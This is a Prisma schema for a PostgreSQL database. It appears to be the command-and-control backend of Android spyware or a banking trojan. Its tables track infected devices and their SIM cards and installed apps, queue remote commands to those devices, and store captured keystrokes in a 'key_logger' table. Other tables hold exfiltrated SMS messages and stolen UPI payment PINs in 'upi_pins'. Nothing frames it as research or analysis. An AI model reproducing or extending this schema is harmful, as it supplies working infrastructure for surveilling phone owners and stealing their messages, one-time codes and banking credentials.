datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

generator client {
  provider = "prisma-client-js"
}

model DeviceCommand {
  id           String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
  device_id    String
  command      String
  payload      Json?
  status       String?   @default("pending")
  created_at   DateTime? @default(now()) @db.Timestamptz
  delivered_at DateTime? @db.Timestamptz
  executed_at  DateTime? @db.Timestamptz
  device       Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)

  @@map("device_commands")
}

model Device {
  device_id          String          @id
  android_id         String?
  manufacturer       String?
  model              String?
  status             Boolean?        @default(false)
  last_seen          DateTime?       @db.Timestamptz
  brand              String?
  product            String?
  android_version    String?
  raw_device_info    String?
  sim_cards          Json?
  service_status     Json?
  oem_status         Json?
  power_save_status  Json?
  screen_status      Json?
  process_importance String?
  created_at         DateTime?       @default(now()) @db.Timestamptz
  updated_at         DateTime?       @default(now()) @db.Timestamptz
  commands           DeviceCommand[]
  heartbeats         Heartbeat[]
  installed_apps     InstalledApp[]
  key_logs           KeyLog[]
  sms_messages       SmsMessage[]
  upi_pins           UpiPin[]
  build_id           String?
  app_id             String?
  heartbeat          Json?

  @@map("devices")
}

model Heartbeat {
  id          BigInt    @id @default(autoincrement())
  device_id   String
  last_update DateTime  @default(now()) @db.Timestamptz
  type        String?   @default("ping")
  created_at  DateTime? @default(now()) @db.Timestamptz
  updated_at  DateTime? @default(now()) @db.Timestamptz
  device      Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)

  @@map("heartbeat")
}

model InstalledApp {
  device_id          String
  package_name       String
  app_name           String
  icon               String?
  version_name       String?
  version_code       BigInt?
  first_install_time BigInt?
  last_update_time   BigInt?
  is_system_app      Boolean?  @default(false)
  target_sdk         Int?
  min_sdk            Int?
  sync_timestamp     BigInt
  created_at         DateTime? @default(now()) @db.Timestamptz
  updated_at         DateTime? @default(now()) @db.Timestamptz
  device             Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)

  @@id([device_id, package_name])
  @@map("installed_apps")
}

model KeyLog {
  id          String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
  device_id   String
  key         String
  keylogger   String
  created_at  DateTime  @default(now()) @db.Timestamptz
  currentDate DateTime? @map("currentDate") @db.Timestamptz
  device      Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)

  @@map("key_logger")
}

model SmsMessage {
  id          String
  device_id   String
  local_sms_id String
  address     String
  body        String
  date        String
  timestamp   BigInt
  type        Int
  sync_status String?   @default("synced")
  created_at  DateTime? @default(now()) @db.Timestamptz
  updated_at  DateTime? @default(now()) @db.Timestamptz
  device      Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)

  @@id([device_id, local_sms_id])
  @@map("sms_messages")
}

model UpiPin {
  id          String    @id @default(dbgenerated("gen_random_uuid()")) @db.Uuid
  device_id   String
  pin         String
  created_at  DateTime  @default(now()) @db.Timestamptz
  currentDate DateTime? @map("currentDate") @db.Timestamptz
  device      Device    @relation(fields: [device_id], references: [device_id], onDelete: Cascade)

  @@map("upi_pins")
}
